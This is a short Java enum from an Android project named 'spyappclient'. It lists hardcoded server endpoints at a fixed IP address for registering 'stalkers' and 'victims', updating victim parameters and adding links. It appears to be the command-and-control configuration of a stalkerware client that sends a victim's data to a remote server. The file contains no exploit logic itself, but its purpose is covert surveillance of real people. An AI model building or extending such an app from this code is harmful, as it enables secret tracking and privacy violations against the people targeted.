package com.example.alber.spyappclient;

public enum URLS {

    TEST("http://35.204.80.21:4567/test"),
    ADDSTALKER("http://35.204.80.21:4567/stalker/addStalker"),
    GETSTALKER("http://35.204.80.21:4567/stalker/getStalker/"),
    UPDATEVICTIMPARAMS("http://35.204.80.21:4567/victim/updatesParams/"),
    ADDVIVTIM("http://35.204.80.21:4567/victim/addVictim"),
    GETVICTIM("http://35.204.80.21:4567/victim/getVictim/:id/:name"),
    ADDLINKS("http://35.204.80.21:4567/stalker/links/");
    String url;
    URLS(String address) {
        url=address;
    }
}
